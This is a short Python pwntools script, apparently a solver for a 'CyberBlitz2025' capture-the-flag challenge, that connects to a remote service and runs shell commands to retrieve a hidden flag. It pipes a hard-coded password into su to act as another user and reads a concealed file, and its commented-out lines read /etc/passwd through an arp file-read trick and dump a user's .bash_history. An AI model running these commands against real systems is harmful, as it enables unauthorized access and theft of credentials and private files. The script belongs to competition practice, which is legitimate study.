import sys
from pwn import *

# READ_PASSWD = b"arp -v -f /etc/passwd"
# READ_HISTORY = b'echo orlander | su notroot -c "cat /home/notroot/.bash_history"'
READ_FLAG = b'echo orlander | su notroot -c "cat  /run/systemd/.systemd/dKOe1nHg8vw5BY7UU5"'

io = remote(sys.argv[1], sys.argv[2])
io.sendlineafter(b'#', b"rbash")
idk = io.recvuntil(b"#")
io.sendlineafter(b'#', READ_FLAG)
flag = io.recvline_contains(b"CyberBlitz2025").decode().split(" ")[2]
print(flag)